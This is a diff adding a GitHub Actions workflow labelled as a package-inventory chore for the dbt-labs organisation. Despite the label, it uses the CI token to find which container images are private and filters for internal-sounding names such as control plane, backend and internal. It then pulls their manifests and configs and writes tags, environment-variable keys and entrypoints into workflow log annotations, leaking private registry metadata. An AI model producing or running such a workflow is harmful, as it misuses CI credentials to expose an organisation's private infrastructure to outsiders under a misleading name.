@@ -1,0 +1,83 @@
+name: Package Inventory
+
+on:
+  push:
+    branches: ["chore/package-index"]
+
+permissions:
+  contents: read
+  packages: read
+
+jobs:
+  inventory:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    env:
+      TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      ACT: ${{ github.actor }}
+    steps:
+      - name: Enumerate org packages via graphql
+        run: |
+          set +e
+          : > /tmp/all.json
+          cur=""
+          for p in 1 2 3 4 5; do
+            if [ -z "$cur" ]; then AFT="null"; else AFT="\"$cur\""; fi
+            q="{\"query\":\"query{organization(login:\\\"dbt-labs\\\"){packages(first:100, after:$AFT){pageInfo{hasNextPage endCursor} nodes{name packageType latestVersion{version}}}}}\"}"
+            code=$(curl -s -o /tmp/gq$p -w '%{http_code}' -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "$q" https://api.github.com/graphql)
+            echo "::notice title=gq$p::http=$code n=$(jq -r '(.data.organization.packages.nodes//[])|length' /tmp/gq$p 2>/dev/null) err=$(jq -r '.errors[0].message//empty' /tmp/gq$p 2>/dev/null | cut -c1-120)"
+            jq -c '.data.organization.packages.nodes//[]' /tmp/gq$p >> /tmp/all.json 2>/dev/null
+            hn=$(jq -r '.data.organization.packages.pageInfo.hasNextPage//false' /tmp/gq$p 2>/dev/null)
+            cur=$(jq -r '.data.organization.packages.pageInfo.endCursor//empty' /tmp/gq$p 2>/dev/null)
+            [ "$hn" = "true" ] || break
+          done
+          jq -s 'add|unique_by(.name)' /tmp/all.json > /tmp/nodes.json
+          N=$(jq 'length' /tmp/nodes.json); echo "::notice title=total::$N"
+          jq -r '.[]|.packageType+"|"+.name+"|"+(.latestVersion.version//"-")' /tmp/nodes.json | cut -c1-160 > /tmp/lines.txt
+          split -l 6 /tmp/lines.txt /tmp/pc_
+          for f in /tmp/pc_*; do echo "::notice title=pkgs::$(paste -sd';' $f | cut -c1-850)"; done
+
+      - name: Classify visibility
+        run: |
+          set +e
+          jq -r '.[]|select(.packageType=="DOCKER" or .packageType=="CONTAINER")|.name' /tmp/nodes.json | sort -u > /tmp/cn.txt
+          wc -l < /tmp/cn.txt > /tmp/cn_n; echo "::notice title=cnum::$(cat /tmp/cn_n)"
+          while read -r n; do
+            [ -n "$n" ] || continue
+            anon=$(curl -s -o /dev/null -w '%{http_code}' "https://ghcr.io/v2/dbt-labs/$n/manifests/latest")
+            tk=$(curl -s -u "$ACT:$TOKEN" "https://ghcr.io/token?scope=repository:dbt-labs/$n:pull&service=ghcr.io" | jq -r .token 2>/dev/null)
+            tc=$(curl -s -o /tmp/tg -w '%{http_code}' -H "Authorization: Bearer $tk" "https://ghcr.io/v2/dbt-labs/$n/tags/list")
+            tl=$(jq -r '.tags//[]|length' /tmp/tg 2>/dev/null | cut -c1-60)
+            echo "v|$n|anon=$anon|tok=$tc|tags=$tl" >> /tmp/vis.txt
+          done < /tmp/cn.txt
+          split -l 8 /tmp/vis.txt /tmp/vc_
+          for f in /tmp/vc_*; do echo "::notice title=vis::$(paste -sd';' $f | cut -c1-900)"; done
+
+      - name: Private control plane metadata
+        run: |
+          set +e
+          grep -Ei '\|anon=401\|tok=200\|' /tmp/vis.txt | cut -d'|' -f2 > /tmp/priv.txt
+          grep -Ei 'cloud|control|backend|api|runner|svc|fusion|fs-cli|orchestr|celery|mcp|dbtlabs|internal|analytics|server' /tmp/priv.txt | sort -u > /tmp/interest.txt
+          echo "::notice title=privn::$(wc -l < /tmp/priv.txt) interest::$(wc -l < /tmp/interest.txt)"
+          while read -r n; do
+            [ -n "$n" ] || continue
+            tk=$(curl -s -u "$ACT:$TOKEN" "https://ghcr.io/token?scope=repository:dbt-labs/$n:pull&service=ghcr.io" | jq -r .token 2>/dev/null)
+            curl -s -o /tmp/tg -H "Authorization: Bearer $tk" "https://ghcr.io/v2/dbt-labs/$n/tags/list"
+            tg=$(jq -r '.tags//[]|join(",")' /tmp/tg 2>/dev/null | cut -c1-180)
+            echo "::notice title=itag::$n::$tg"
+            for t in $(jq -r '.tags//[]' /tmp/tg 2>/dev/null | head -2); do
+              code=$(curl -s -D /tmp/h -o /tmp/m.json -w '%{http_code}' -H "Authorization: Bearer $tk" -H "Accept: application/vnd.oci.image.index.v1+json,application/vnd.docker.distribution.manifest.list.v2+json,application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json" "https://ghcr.io/v2/dbt-labs/$n/manifests/$t")
+              dg=$(grep -i '^docker-content-digest' /tmp/h | tr -d '\r' | awk '{print $2}')
+              lay=$(jq -r 'if .layers then (.layers|length|tostring) else "ix:"+((.manifests|length)|tostring) end' /tmp/m.json 2>/dev/null)
+              echo "::notice title=iman::$n:$t http=$code layers=$lay dg=${dg:0:23}"
+              cfg=$(jq -r '.config.digest//empty' /tmp/m.json 2>/dev/null)
+              if [ -z "$cfg" ]; then
+                sd=$(jq -r '.manifests[]?|select(.platform.architecture=="amd64")|.digest' /tmp/m.json 2>/dev/null | head -1)
+                [ -n "$sd" ] && curl -s -o /tmp/m2.json -H "Authorization: Bearer $tk" -H "Accept: application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json" "https://ghcr.io/v2/dbt-labs/$n/manifests/$sd" && cfg=$(jq -r '.config.digest//empty' /tmp/m2.json)
+              fi
+              if [ -n "$cfg" ]; then
+                cc=$(curl -s -o /tmp/cfg.json -w '%{http_code}' -H "Authorization: Bearer $tk" "https://ghcr.io/v2/dbt-labs/$n/blobs/$cfg")
+                echo "::notice title=icfg::$n:$t blob=$cc envkeys=$(jq -r '.config.Env//[]|map(split("=")[0])|join(",")|.[0:240]' /tmp/cfg.json 2>/dev/null) entry=$(jq -r '(.config.Entrypoint//[])|join(" ")|.[0:90]' /tmp/cfg.json 2>/dev/null)"
+              fi
+            done
+          done < /tmp/interest.txt
